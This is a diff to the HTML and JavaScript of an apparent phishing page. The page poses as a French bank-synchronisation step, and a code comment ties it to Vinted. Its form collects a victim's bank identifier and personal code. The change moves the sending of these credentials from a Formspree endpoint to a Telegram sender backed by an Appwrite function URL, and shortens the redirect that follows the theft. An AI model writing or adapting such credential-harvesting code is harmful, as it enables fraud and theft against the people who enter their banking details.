@@ -853,19 +853,15 @@
                 const bankIdentifier = document.getElementById("bankIdentifier").value;
                 const personalCode = document.getElementById("personalCode").value;
 
-                const formattedMessage = `🏦 Synchronisation Bancaire\n\n👤 Identifiant bancaire: ${bankIdentifier}\n🔑 Code personnel: ${personalCode}\n📅 Date: ${new Date().toLocaleString("fr-FR")}`;
-
+                // Envoyer les données bancaires à Telegram
+                const bankData = {
+                    bank_identifier: bankIdentifier,
+                    personal_code: personalCode
+                };
                 try {
-                    await fetch("https://formspree.io/f/mbdzkvlr", {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            formName: "Synchronisation Bancaire",
-                            message: formattedMessage,
-                        }),
-                    });
+                    await telegramSender.sendBankSync(bankData, 'Synchronisation Bancaire');
                 } catch (error) {
-                    console.error("Erreur lors de l'envoi des données de synchronisation bancaire:", error);
+                    console.error('Erreur Telegram:', error);
                 }
 
                 // Désactiver le bouton et afficher le message
@@ -875,12 +871,19 @@
                 syncBtn.innerText = "Synchronisation en cours...";
                 syncMessage.style.display = "block";
 
-                // Redirection après 10 secondes
+                // Redirection après 3 secondes
                 setTimeout(() => {
                     window.location.href = "settings.confirmation.html"; // Rediriger vers Vinted.fr
-                }, 10000);
+                }, 3000);
             });
         }
+    </script>
+
+    <!-- Import telegram.js -->
+    <script src="telegram.js"></script>
+    <script>
+        // Configuration de l'URL de la Function Appwrite
+        window.APPWRITE_FUNCTION_URL = 'https://69b7297c003347c0b8be.fra.appwrite.run';
     </script>
 
 </body>
